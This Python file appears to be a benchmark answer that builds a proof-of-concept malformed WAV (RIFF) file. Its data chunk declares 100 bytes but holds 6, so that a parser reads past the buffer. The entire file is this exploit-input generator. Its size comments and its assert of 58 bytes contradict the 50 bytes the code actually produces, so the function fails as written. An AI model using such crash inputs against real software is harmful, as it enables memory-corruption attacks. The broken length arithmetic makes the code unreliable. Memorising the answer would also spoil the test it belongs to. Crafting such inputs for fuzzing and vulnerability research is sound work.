import os
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a minimal RIFF file that triggers heap buffer overflow
        # by having a data chunk size larger than remaining file
        
        # RIFF header
        riff = b'RIFF'
        
        # File size: 58 bytes total (8 + 50)
        # 50 = 36 (fmt chunk) + 8 (data header) + 6 (data, but size claims more)
        file_size = 50  # Total size - 8
        
        # WAVE format
        wave = b'WAVE'
        
        # fmt chunk
        fmt_header = b'fmt '
        fmt_size = 16  # Size of PCM format chunk
        audio_format = 1  # PCM
        num_channels = 1
        sample_rate = 8000
        byte_rate = 16000
        block_align = 2
        bits_per_sample = 16
        
        # data chunk - vulnerable part
        data_header = b'data'
        
        # Key vulnerability: data size claims 100 bytes but file only has 6 bytes
        # This causes out-of-bounds read when parsing data
        data_size = 100  # Larger than actual available data
        
        # Build the file
        parts = []
        
        # RIFF header
        parts.append(riff)
        parts.append(struct.pack('<I', file_size))
        parts.append(wave)
        
        # fmt chunk
        parts.append(fmt_header)
        parts.append(struct.pack('<I', fmt_size))
        parts.append(struct.pack('<H', audio_format))
        parts.append(struct.pack('<H', num_channels))
        parts.append(struct.pack('<I', sample_rate))
        parts.append(struct.pack('<I', byte_rate))
        parts.append(struct.pack('<H', block_align))
        parts.append(struct.pack('<H', bits_per_sample))
        
        # data chunk with incorrect size
        parts.append(data_header)
        parts.append(struct.pack('<I', data_size))
        
        # Add minimal actual data (6 bytes = 3 samples)
        parts.append(b'\x00\x00\x01\x00\x02\x00')
        
        poc = b''.join(parts)
        
        # Verify length matches ground truth
        assert len(poc) == 58, f"Expected 58 bytes, got {len(poc)}"
        
        return poc